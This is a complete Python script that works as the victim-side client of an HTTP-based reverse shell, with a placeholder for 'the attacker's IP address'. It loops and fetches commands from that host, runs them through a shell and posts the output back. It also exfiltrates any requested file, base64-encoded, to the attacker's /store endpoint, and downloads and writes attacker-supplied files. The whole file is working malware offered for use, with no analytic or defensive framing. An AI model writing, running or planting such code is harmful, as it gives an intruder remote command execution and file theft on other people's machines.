from urllib import request, parse
import subprocess
import time
import os
import base64

ATTACKER_IP = '127.0.0.1' # change this to the attacker's IP address
ATTACKER_PORT = 8080

# Data is a dict
def send_post(data, url=f'http://{ATTACKER_IP}:{ATTACKER_PORT}',dst_path=f''):
    data = {"rfile": data,"path": dst_path}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    request.urlopen(req) # send request


def send_file(command):
    try:
        pull, path, dst_path = command.strip().split(' ') 
    except ValueError:
        send_post("[-] Invalid grab command (maybe multiple spaces)")
        return

    if not os.path.exists(path):
        send_post("[-] Not able to find the file")
        return

    store_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/store' # Posts to /store
    with open(path, 'rb') as fp:
        send_post(base64.urlsafe_b64encode(fp.read()), url=store_url, dst_path=dst_path)

def save_file(command):
 if 'push' in command:
  push, path, dst_path = command.strip().split(' ')
  get_url = f'http://{ATTACKER_IP}:{ATTACKER_PORT}/?get={path}'   
  with request.urlopen(get_url) as f:
   res_file = f.read()
  with open('{}'.format(dst_path),'wb') as f:
   f.write(base64.urlsafe_b64decode(res_file))
      
def run_command(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    send_post(CMD.stdout.read())
    send_post(CMD.stderr.read())


while True:
    command = request.urlopen(f"http://{ATTACKER_IP}:{ATTACKER_PORT}").read().decode()

    if 'terminate' in command:
        break

    # pull file
    if 'pull' in command:
        send_file(command)
        continue
    # push file
    if 'push' in command:
        save_file(command)
        continue

    run_command(command)
    time.sleep(1)
